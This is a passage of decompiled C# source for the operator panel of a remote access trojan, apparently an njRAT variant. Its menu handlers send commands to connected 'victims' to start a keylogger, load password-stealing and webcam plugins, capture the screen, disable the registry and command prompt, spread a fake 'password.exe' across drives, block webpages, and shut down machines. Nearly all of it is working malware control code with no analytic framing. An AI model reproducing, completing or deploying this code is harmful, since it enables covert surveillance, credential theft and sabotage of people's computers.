									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void PersonaliseToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void NormalToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = Interaction.InputBox("URL", "Your Adfoc.us URL", "-------", -1, -1);
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"money"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void HideMonitorToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void ShowMonitorToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void CloseCDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"closecd"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void TextToSpeechToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void SwapMouseButtonToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"ReverseMouse"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void NormalToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"NormalMouse"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"win1"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void DisableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"win2"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void RadioButton1_CheckedChanged(object sender, EventArgs e)
		{
			this.P1.Visible = false;
		}

		private void RadioButton2_CheckedChanged(object sender, EventArgs e)
		{
			this.P1.Visible = true;
		}

		private void QuestionMessageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "MsgboxQ" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Msgbox", "Send Msgbox", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ExlamationMessageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "MsgboxExl" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Msgbox", "Send Msgbox", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void LogOffToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"logoff"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void DisableToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"dcmd"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void EnableToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"ecmd"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void DisableToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"DisableRegistry"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void EnableToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"EnableRegistry"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void OpenFromDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.FileName = "";
				openFileDialog.Filter = "jpg|*.jpg| png|*.png | all Files|(*.*)";
				flag = (openFileDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					bool flag2 = true;
					string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
					byte[] array = FN.SB(ref text);
					MemoryStream memoryStream = new MemoryStream();
					string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
					memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
					thread.Start(new object[]
					{
						this.L1V.SelectedItems,
						memoryStream.ToArray(),
						Color.Red
					});
				}
			}
		}

		private void SmallDesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void L1_DoubleClick1(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count > 0;
			if (flag)
			{
				((Client)this.L1V.SelectedItems[0].Tag).Send("inf");
			}
		}

		private void L1_SelectedIndexChanged_1(object sender, EventArgs e)
		{
			this.conz.Text = "Selected [" + Conversions.ToString(this.L1V.SelectedItems.Count) + "]";
			bool flag = this.L1V.SelectedItems.Count > 0;
			if (flag)
			{
				sokserver.ensr = false;
			}
			PictureBox p = this.P1;
			PictureBox obj = p;
			lock (obj)
			{
				flag = (this.L1V.SelectedItems.Count == 1 & this.L1V.SmallImageList == this.IMG2);
				if (flag)
				{
					this.CEL = (Client)this.L1V.SelectedItems[0].Tag;
					flag = (this.CEL.snf != null);
					if (flag)
					{
						sokserver.F.L2.Items[0].SubItems[1].Text = this.CEL.snf[0];
						sokserver.F.L2.Items[1].SubItems[1].Text = this.CEL.snf[1];
						sokserver.F.L2.Items[2].SubItems[1].Text = "%" + this.CEL.snf[2] + "%";
						sokserver.F.L2.Items[3].SubItems[1].Text = this.CEL.snf[3];
						sokserver.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
					}
					else
					{
						sokserver.F.L2.Items[0].SubItems[1].Text = "";
						sokserver.F.L2.Items[1].SubItems[1].Text = "";
						sokserver.F.L2.Items[2].SubItems[1].Text = "";
						sokserver.F.L2.Items[3].SubItems[1].Text = "";
						sokserver.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
						this.CEL.Send("inf");
					}
					flag = (this.CEL.pc != null);
					if (flag)
					{
						PictureBox p2 = sokserver.F.P1;
						PictureBox obj2 = p2;
						lock (obj2)
						{
							sokserver.F.P1.Image = (Image)this.CEL.pc.Clone();
						}
					}
					this.CEL.Send(string.Concat(new string[]
					{
						"Meu@",
						sokserver.Y,
						Conversions.ToString(this.P1.Width),
						sokserver.Y,
						Conversions.ToString(this.P1.Height)
					}));
				}
				else
				{
					sokserver.F.P1.Image = null;
					this.CEL = null;
				}
			}
			this.ecran.Start();
		}

		private void P1_Click_1(object sender, EventArgs e)
		{
			bool flag = this.CEL != null;
			if (flag)
			{
				MyProject.Forms.slayermonitor.Show();
				this.CEL.Send(string.Concat(new string[]
				{
					"Meu@",
					sokserver.Y,
					Conversions.ToString(this.P1.Width),
					sokserver.Y,
					Conversions.ToString(this.P1.Height)
				}));
			}
		}

		private void OpenWebPageToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		private void BlockWebpageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "BlocKPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void SpreadInHardDriveToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "spreading" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Spread Name (.exe)", "Entre Spread name(.exe)", "password.exe", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ecran_Tick(object sender, EventArgs e)
		{
			bool flag = this.CEL != null;
			if (flag)
			{
				this.CEL.Send(string.Concat(new string[]
				{
					"CAP",
					sokserver.Y,
					Conversions.ToString(this.P1.Width),
					sokserver.Y,
					Conversions.ToString(this.P1.Height)
				}));
				this.CEL.Send(string.Concat(new string[]
				{
					"CAP",
					sokserver.Y,
					Conversions.ToString(MyProject.Forms.slayermonitor.PictureBox1.Width),
					sokserver.Y,
					Conversions.ToString(MyProject.Forms.slayermonitor.PictureBox1.Height)
				}));
			}
		}

		private void ChangeVictimColorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				ColorDialog colorDialog = new ColorDialog();
				flag = (colorDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					this.L1V.SelectedItems[0].ForeColor = colorDialog.Color;
				}
				else
				{
					flag = (colorDialog.ShowDialog() == DialogResult.Cancel);
					if (flag)
					{
						this.L1V.SelectedItems[0].ForeColor = Color.White;
					}
				}
			}
		}

		private void HhhhhToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("Nj_fm.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void HhhhhhToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Form3.Show();
		}

		private void YyyyyyyyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "send", new object[]
					{
						"rss"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void HhhhhhhhToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					bool flag = sokserver.Gform(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("reg", RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "ip", new object[0], null, null, null)))))) == null;
					if (flag)
					{
						Reg reg = new Reg();
						reg.Name = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("reg", RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "ip", new object[0], null, null, null)))));
						reg.sk = (Client)listViewItem.Tag;
						reg.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(reg.sk.L)));
						reg.Show();
					}
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem18_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("pw.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, true);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void ToolStripMenuItem19_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"kl"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void YYToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1V.SelectedItems[0].Tag), null, "folder", new object[0], null, null, null))));
				if (flag)
				{
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1V.SelectedItems[0].Tag), null, "folder", new object[0], null, null, null))));
				}
				object[] array = new object[1];
				object objectValue = RuntimeHelpers.GetObjectValue(this.L1V.SelectedItems[0].Tag);
				array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[0], null, null, null))));
				object[] array2 = array;
				bool[] array3 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(null, typeof(Process), "Start", array2, null, null, array3, true);
				flag = array3[0];
				if (flag)
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[]
					{
						RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2[0])))
					}, null, null, true, true);
				}
			}
			catch (Exception expr_149)
			{
				ProjectData.SetProjectError(expr_149);
				Exception projectError = expr_149;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void ToolStripMenuItem16_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					listViewItem.ForeColor = Color.LightSteelBlue;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(listViewItem.Tag))), null, "send", new object[]
					{
						"EnviarDesktooopp"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ContextMenuStrip3_Opening(object sender, CancelEventArgs e)
		{
		}

		private void ToolStripMenuItem17_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("Nj_cam.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void ToolStripMenuItem20_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("Nj_ch.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"Restart"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem30_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"Shutdown"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void GGGToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"showtaskbar"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void GGToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"hidetaskbar"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void OpenCDToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
					{
						"opencd"
					}, null, null, null, true);
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "Msgboxerr" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Msgbox", "Send Msgbox", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ToolStripMenuItem3_Click_1(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "Msgboxinfo" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Msgbox", "Send Msgbox", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
